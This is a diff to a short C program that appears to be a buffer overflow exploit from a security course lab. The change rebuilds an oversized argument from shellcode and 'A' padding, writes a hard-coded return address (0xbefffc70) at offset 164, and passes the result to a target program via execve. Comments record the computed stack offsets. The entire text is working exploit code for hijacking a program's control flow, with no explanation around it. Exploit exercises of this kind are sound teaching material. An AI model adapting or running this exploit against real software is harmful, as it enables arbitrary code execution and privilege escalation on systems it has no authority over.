@@ -9,12 +9,18 @@
 
 int main(void)
 {
-	char arg1[170];
-	memset(arg1, '0', sizeof(arg1)-37);
-	strcat(arg1, shellcode);
+	char arg1[180];
+	strcpy(arg1, shellcode);
+	memset(arg1 + strlen(shellcode), 'A', sizeof(arg1)-37);
+	arg1[164]=0x70;
+	arg1[165]=0xfc;
+	arg1[166]=0xff;
+	arg1[167]=0xbe;
 	char *args[] = { TARGET, arg1, NULL };
 	char *env[] = { NULL };
-
+	// return = befffd14
+	// arg = befffc70
+	//  = diff of 168 +4 +1 = 173
 	if (0 > execve(TARGET, args, env))
 		fprintf(stderr, "execve failed.\n");
 
